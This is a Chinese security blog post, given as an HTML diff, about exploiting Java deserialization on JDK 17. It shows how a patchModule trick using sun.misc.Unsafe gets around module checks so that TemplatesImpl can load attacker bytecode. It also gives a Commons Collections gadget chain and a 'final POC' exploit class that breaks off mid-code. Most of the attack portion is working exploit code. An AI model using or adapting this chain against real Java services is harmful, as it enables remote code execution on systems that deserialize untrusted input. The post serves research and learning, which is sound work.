@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>jdk17绕过模块化系统利用TemplatesImpl - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="jdk17绕过模块化系统利用TemplatesImpl - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/09/18/jdk17%E7%BB%95%E8%BF%87%E6%A8%A1%E5%9D%97%E5%8C%96%E7%B3%BB%E7%BB%9F%E5%88%A9%E7%94%A8TemplatesImpl/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-09-17T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-09-18T00:00:00+08:00">
+      September 18, 2025
+    </time>
+    
+
+    <h1 class="title">jdk17绕过模块化系统利用TemplatesImpl</h1>
+  </div>
+
+  <div class="content">
+    <p>本文参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18628">jdk17&amp;CC链绕过模块检测利用TemplatesImpl-先知社区</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_17</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(Class.class.getModule().getName());</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">appClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">javassist</span>.LoaderClassPath(appClassLoader));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(<span class="string">&quot;eval&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz2</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code2 = clazz2.toBytecode();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(code));</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        patchModule(test_17.class,aClass);</span><br><span class="line">        System.out.println(test_17.class.getModule().getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass.getDeclaredConstructor().newInstance();</span><br><span class="line">        setFiled(o,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFiled(o,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code,code2&#125;);</span><br><span class="line">        setFiled(o,<span class="string">&quot;_transletIndex&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//setFiled(o,&quot;_auxClasses&quot;,new HashMap&lt;&gt;());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        patchModule(test_17.class,eval.class);</span><br><span class="line">        System.out.println(test_17.class.getModule().getName());</span><br><span class="line">        <span class="comment">// 从文件中反序列化对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">o1</span> <span class="operator">=</span> (Templates) ois.readObject();</span><br><span class="line">        o1.getOutputProperties();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">patchModule</span><span class="params">(Class clazz,Class goalclass)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">UnsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> UnsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe)unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ObjectModule</span> <span class="operator">=</span> Class.class.getMethod(<span class="string">&quot;getModule&quot;</span>).invoke(goalclass);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> clazz;</span><br><span class="line">            <span class="type">long</span> addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">            unsafe.getAndSetObject(currentClass,addr,ObjectModule);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object templates, String name, Object values)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(templates,values);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从参考文章拿一下EXP简单分析一下,核心主要是patchModule函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">patchModule</span><span class="params">(Class clazz,Class goalclass)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">UnsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> UnsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe)unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ObjectModule</span> <span class="operator">=</span> Class.class.getMethod(<span class="string">&quot;getModule&quot;</span>).invoke(goalclass);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> clazz;</span><br><span class="line">            <span class="type">long</span> addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">            unsafe.getAndSetObject(currentClass,addr,ObjectModule);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取一个Unsafe实例和目标调用对象的Module,接着获取module字段在Class.class内存中的偏移量，最后调用Unsafe#getAndSetObject,将当前class的addr对应的值改为目标调用对象的module。</p>
+<p>这个patchModule的作用就是修改某个class的module字段值为另一个class的module,这样调用反射调用目标对象的方法或者字段就不会被模块化系统限制了</p>
+<p>在没有用patchModule时</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509191302345.png" alt="image-202509191302345"></p>
+<p>可以看到无法反射实例化TemplatesImpl</p>
+<p>调用一下</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509191311187.png" alt="image-20250919131158085"></p>
+<p>成功实例化，并且System.out.println(Poc.class.getModule())也输出的是java.xml</p>
+<p>另外创建一个jdk17项目，模拟远程服务器。</p>
+<p>原来cc链子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap::readObject</span><br><span class="line">	TiedMapEntry::hashCode</span><br><span class="line">		LazyMap::get</span><br><span class="line">			ChainedTransformer::transform</span><br><span class="line">                ConstantTransformer::transform</span><br><span class="line">                InstantiateTransformer::transform</span><br><span class="line">                	TrAXFilter::带参构造</span><br><span class="line">                		TemplatesImpl::newTransformer -&gt; TemplatesImpl::getTransletInstance -&gt; TemplatesImpl::defineTransletClasses -&gt; TransletClassLoader::defineClass</span><br></pre></td></tr></table></figure>
+
+<p>在jdk8中这条链子可以顺利执行，但是在jdk17中第一个报错的点在调用TrAxFilter构造函数时</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509221544003.png" alt="image-20250922154407844"></p>
+<p>TrAXFilter属于模块java.xml,而InstantiateTransformer是cc库的类，属于未命名模块，java.xml没有导出给未命名模块所以不能实例化TrAXFilter</p>
+<p>所以直接用InstantiateTransformer#transformer实例化TrAXFilter，通过其构造函数调用templatesImpl#newTransformer是不行了</p>
+<p>前文提到的patchModule方法可以改变模块，能不能通过某个方法在远程服务器上执行patchModule呢？</p>
+<p>在其他cc链中有利用到InvokerTransformer,其tansformer方法可以调用任意方法</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509221553131.png" alt="image-20250922155339044"></p>
+<p>patchModule的核心是Unsafe#getAndSetObject(Class targetClass,Long address,Module module)，因为getAndSetObject不是实例方法,如果想要调用首先得获得Unsafe实例，因为Unsafe是不允许序列化的，所以只能在远程服务器获取Unsafe的theUnsafe字段，因为这个字段是private，所以还得调用setAccessible(true)</p>
+<p>我感觉给InvokerTransformer#transformer传个Unsafe.class,获取其getDeclaredField,然后调用，这个方法就能返回一个Field字段，把这个Field通过ChainedTransformer传给下一个InvokerTransformer,调用setAccessible,但是setAccessible返回void,所以不能只用InvokerTransformer,需要找找其他transformer方法，看哪个能实现这个逻辑。</p>
+<p>ClosureTransformer</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509231549711.png" alt="image-20250923154949641"></p>
+<p>TransformerClosure</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509231551756.png" alt="image-20250923155113694"></p>
+<p>将TransformerClosure放进ClosureTransformer.iClosure中就可以通过execute执行setAccessible，返回的还是Field,这样就可以调用Field.get()了</p>
+<p>但是呢getAndSetObject(Object,long,Object),我们的第三个参数是Module，但是Module是不可以反序列化的，仔细想一想也很难通过链子动态创建Module放进第三个参数里面</p>
+<p>那就去看看反射调用时的检测逻辑到底是怎样的，找找有没有地方能绕过</p>
+<p>我在调试的时候犯了一个很愚蠢的错误，花了我很多时间</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509232055562.png" alt="image-20250923205550413"></p>
+<p>我的第一个断点就是断在AccessibleObject这个类里面的，因为这个类是用来检测反射的，在程序运行的过程中肯定用的非常频繁，所以当我调试时断的地方不是我想断的，通过调用栈也可以看出来，这是在运行main函数之前，但是我一直没注意，就一直在这个地方调试，浪费时间了。</p>
+<p>每次写文章我都喜欢半途而废。后面的调试部分又不想写了</p>
+<p>最关键的地方是</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509232214266.png" alt="image-20250923221420099"></p>
+<p>只要你包名是这个HashMap中的，就返回true,就能通过模块检测。pn是在哪里赋值的？</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509232215233.png" alt="image-20250923221558073"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202509232216097.png" alt="image-20250923221638964"></p>
+<p>很明显就是Class的packageName这个属性。所以把TrAXFilter.class.packageName属性改成那个HashMap中有的就行</p>
+<p>最终POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springonly;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnswerPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">appClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">javassist</span>.LoaderClassPath(appClassLoader));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.example.springonly.Evil&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz2</span> <span class="operator">=</span> pool.get(Evil1.class.getName());<span class="comment">//这里随便一个类就行，code2凑数用的</span></span><br><span class="line">        <span class="type">byte</span>[] code2 = clazz2.toBytecode();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(code));</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        patchModule(AnswerPoc.class,aClass);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span>  aClass.getDeclaredConstructor().newInstance();</span><br><span class="line">        setFiled(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFiled(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code,code2&#125;);</span><br><span class="line">        setFiled(templates,<span class="string">&quot;_transletIndex&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; TrAXFilter = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">invokerTransformer5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getAndSetObject&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,<span class="type">long</span>.class,Object.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>),<span class="number">60</span>,<span class="string">&quot;javax.xml&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;get&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;setAccessible&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">boolean</span>.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">true</span>&#125;);</span><br><span class="line">        <span class="type">TransformerClosure</span> <span class="variable">transformerClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerClosure</span>(invokerTransformer2);</span><br><span class="line">        <span class="type">ClosureTransformer</span> <span class="variable">ClosureTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClosureTransformer</span>(transformerClosure);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredField&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;theUnsafe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>));</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3,invokerTransformer4,constantTransformer2,invokerTransformer5&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">keyTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        patchModule(invokerTransformer.getClass(),aClass);</span></span><br><span class="line">        System.out.println(TrAXFilter.getModule().getName());</span><br><span class="line">        System.out.println(invokerTransformer.getClass().getModule().getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(keyTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,transformingComparator);</span><br><span class="line">        patchModule(AnswerPoc.class,priorityQueue.getClass());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.setInt(priorityQueue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件中反序列化对象</span></span><br><span class="line"><span 